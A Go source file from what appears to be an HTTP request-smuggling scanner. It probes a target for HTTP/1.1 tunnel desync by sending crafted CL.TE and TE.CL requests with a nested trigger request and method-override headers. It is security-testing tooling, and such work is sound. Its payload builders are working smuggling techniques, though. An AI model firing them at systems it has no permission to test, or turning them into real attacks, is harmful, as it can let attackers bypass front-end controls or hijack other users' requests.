package scan

// h1tunnel.go — HTTP/1.1 tunnel desync (H1TunnelScan.java)
//
// Strategy: send a request using a method that some back-ends treat as
// "passthrough" (HEAD, OPTIONS) while the body contains a second HTTP
// request. If the back-end forwards the body literally, the nested
// request is processed — producing a distinctive nested response.
//
// Also injects method-override headers (X-HTTP-Method-Override, etc.) to
// confuse front-ends that rewrite methods based on these headers.
//
// Detection: measure timing difference between a paused vs unpaused send.
// A tunnel is confirmed when the paused request takes significantly longer
// (back-end is waiting for the nested request to be processed).

import (
	"github.com/smuggled/smuggled/internal/request"
	"github.com/smuggled/smuggled/internal/config"
	"fmt"
	"net/url"
	"strings"

	"github.com/smuggled/smuggled/internal/permute"
	"github.com/smuggled/smuggled/internal/report"
)

var h1TunnelMethods = []string{"HEAD", "POST", "GET", "OPTIONS"}

var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
	"Real-Method",
	"Request-Method",
	"Method",
}

// ScanH1Tunnel probes for HTTP/1.1 request tunnelling via method confusion.
func ScanH1Tunnel(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	const trigger = "FOO BAR AAH\r\n\r\n"

	for _, method := range h1TunnelMethods {
		req := buildH1TunnelBase(method, path, host)
		for _, tech := range []string{"vanilla", "nameprefix1", "dualchunk"} {
			// Apply a TE permutation to maximise coverage
			mutated := applyTEOrSkip(req, tech)
			if mutated == nil {
				continue
			}

			// Build the CL.TE attack with the trigger as smuggled body
			attack := buildH1TunnelAttack(mutated, trigger, true)

			rep.Log("H1Tunnel probe: method=%s tech=%s target=%s", method, tech, host)

			// Timed probe: pause mid-send after headers to detect back-end waiting
			resp, elapsed, to, err := request.RawRequest(target, attack, cfg)
			if err != nil {
				continue
			}

			// Check for nested HTTP response inside the body
			if !to && len(resp) > 0 && hasNestedHTTPResponse(resp) {
				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:      config.EffectiveMethods(cfg)[0],
					Severity: report.SeverityConfirmed,
					Type:     "H1-tunnel",
					Technique: fmt.Sprintf("%s/%s", method, tech),
					Description: fmt.Sprintf(
						"H1 tunnel desync: nested HTTP response detected in response body "+
							"(method=%s, technique=%s). The back-end forwarded and processed a "+
							"tunnelled request embedded in the body.",
						method, tech),
					Evidence:  fmt.Sprintf("elapsed=%v nested_http=true", elapsed),
					RawProbe:  request.Truncate(string(attack), 512),
				})
				return
			}

			// TE.CL variant
			attackTE := buildH1TunnelAttack(mutated, trigger, false)
			respTE, elapsedTE, toTE, errTE := request.RawRequest(target, attackTE, cfg)
			if errTE != nil {
				continue
			}
			if !toTE && len(respTE) > 0 && hasNestedHTTPResponse(respTE) {
				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:      config.EffectiveMethods(cfg)[0],
					Severity: report.SeverityConfirmed,
					Type:     "H1-tunnel",
					Technique: fmt.Sprintf("%s/%s/TE.CL", method, tech),
					Description: fmt.Sprintf(
						"H1 tunnel desync (TE.CL variant): nested HTTP response detected "+
							"(method=%s, technique=%s).",
						method, tech),
					Evidence:  fmt.Sprintf("elapsed=%v", elapsedTE),
					RawProbe:  request.Truncate(string(attackTE), 512),
				})
				return
			}
			_ = elapsed
		}
	}
}

// buildH1TunnelBase builds the base request with method + override headers.
func buildH1TunnelBase(method, path, host string) []byte {
	var b strings.Builder
	b.WriteString(method + " " + path + " HTTP/1.1\r\n")
	b.WriteString("Host: " + host + "\r\n")
	b.WriteString("User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\r\n")
	b.WriteString("Transfer-Encoding: chunked\r\n")
	b.WriteString("Connection: keep-alive\r\n")
	// Inject method override headers so the front-end may rewrite the method
	if method != "HEAD" {
		for _, h := range methodOverrideHeaders {
			b.WriteString(h + ": HEAD\r\n")
		}
	}
	b.WriteString("\r\n")
	return []byte(b.String())
}

// buildH1TunnelAttack wraps the trigger as a CL.TE (clte=true) or TE.CL attack.
func buildH1TunnelAttack(base []byte, trigger string, clte bool) []byte {
	if clte {
		// CL.TE: 0-terminated chunk + raw trigger as smuggled suffix
		body := "0\r\n\r\n" + trigger
		return request.SetContentLength(request.SetBody(base, body), len(trigger))
	}
	// TE.CL: chunk promises more than we send; CL points before the data
	chunkBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(trigger), trigger)
	cl := len(fmt.Sprintf("%x\r\n", len(trigger)))
	req := request.SetBody(base, chunkBody)
	req = request.SetContentLength(req, cl)
	return req
}

// hasNestedHTTPResponse checks if a response body contains a full HTTP/1.x response.
func hasNestedHTTPResponse(resp []byte) bool {
	// Find the body (after \r\n\r\n)
	const sep = "\r\n\r\n"
	idx := strings.Index(string(resp), sep)
	if idx < 0 {
		return false
	}
	body := string(resp[idx+4:])
	return strings.Contains(body, "HTTP/1.") || strings.Contains(body, "HTTP/2")
}

// applyTEOrSkip applies a TE permutation and returns nil if no effect.
func applyTEOrSkip(req []byte, tech string) []byte {
	return permute.ApplyTE(req, tech)
}
